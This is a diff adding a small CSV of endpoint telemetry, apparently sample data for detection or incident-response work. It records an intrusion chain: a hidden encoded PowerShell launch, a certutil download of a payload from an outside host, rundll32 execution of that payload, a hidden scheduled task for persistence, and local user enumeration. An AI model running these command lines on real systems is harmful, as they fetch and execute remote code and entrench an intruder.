@@ -1,0 +1,6 @@
+time,host,user,process,parent_process,command_line,md5,sha256,event_type,telemetry_detail
+2026-08-10T02:13:12Z,AUR-WS-117,svc_maint,powershell.exe,explorer.exe,"powershell.exe -NoP -W hidden -enc SQBu...",D3A6B4B2AC...B17F,D4CC9B...A2E4,ProcessCreate,"Image load from AppData\\Temp\\update.ps1 with Base64 flag"
+2026-08-10T02:13:14Z,AUR-WS-117,svc_maint,certutil.exe,powershell.exe,"certutil -urlcache -split -f http://object-sync.io/payload.bin C:\\Users\\svc_maint\\AppData\\Local\\Temp\\x.bin",A8F1E2A4A7...7D2C,8D3F...3AB2,ProcessCreate,"Child process launched with temp file output path"
+2026-08-10T02:13:18Z,AUR-WS-117,svc_maint,rundll32.exe,powershell.exe,"rundll32.exe C:\\Users\\svc_maint\\AppData\\Local\\Temp\\x.bin,Run",F2C3F7BC...9B41,2B11...C7D1,ProcessCreate,"Execution path changed before process terminated"
+2026-08-10T02:23:32Z,AUR-FILE-01,svc_maint,cmd.exe,rundll32.exe,"cmd /c schtasks /create /sc onstart /tn \"sys_update_win\" /tr \"powershell -w hidden -nop -c ...\"",0C2A9A...0E4D,19BC...C9D2,ProcessCreate,"Scheduled task scheduled on workstation reboot context"
+2026-08-10T02:24:05Z,AUR-FILE-01,svc_maint,powershell.exe,cmd.exe,"powershell -WindowStyle Hidden -Command Get-LocalUser | Out-File C:\\Temp\\scan.txt",B7E2...7A22,EF77...1C30,ProcessCreate,"Attempted local user enumeration within service context"
